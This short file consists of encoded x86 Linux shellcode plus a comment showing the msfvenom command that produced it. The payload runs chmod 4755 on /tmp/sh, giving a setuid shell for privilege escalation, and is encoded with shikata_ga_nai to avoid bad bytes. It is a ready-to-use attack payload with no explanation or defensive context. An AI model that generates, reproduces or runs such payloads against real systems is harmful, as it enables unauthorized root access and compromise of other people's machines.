\xbe\x4c\xb8\x83\xa4\xda\xd2\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x09\x31\x77\x12\x03\x77\x12\x83\xa3\x44\x61\x51\xa2\xdf\x69\xc2\x86\xf7\x7e\xf2\x26\x08\x50\x86\x4b\x78\x81\x15\xfb\x78\x86\xb1\x16\x71\x38\x42\xb1\x4f\xb8\x28\x40\x08\x74\x2c
# msfvenom -p linux/x86/chmod FILE="/tmp/sh" MODE=4755 -a x86 --platform linux -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai -i 1 -f c |reformat_sc.sh -o
# 59 bytes
